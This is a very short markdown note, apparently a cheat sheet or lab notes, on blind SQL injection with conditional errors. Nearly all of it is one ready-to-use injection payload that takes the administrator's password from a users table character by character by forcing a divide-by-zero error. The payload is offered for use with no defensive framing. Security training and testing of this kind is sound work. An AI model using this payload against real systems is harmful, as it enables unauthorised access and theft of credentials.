# Blind SQL Injection

### Blind SQL Injection with Conditional Errors
Example payload:
``
iCr' and (select case when substr(password, 1, 1) = 'i' then to_char(1/0) else 'a' end from users where username = 'administrator')='a
```
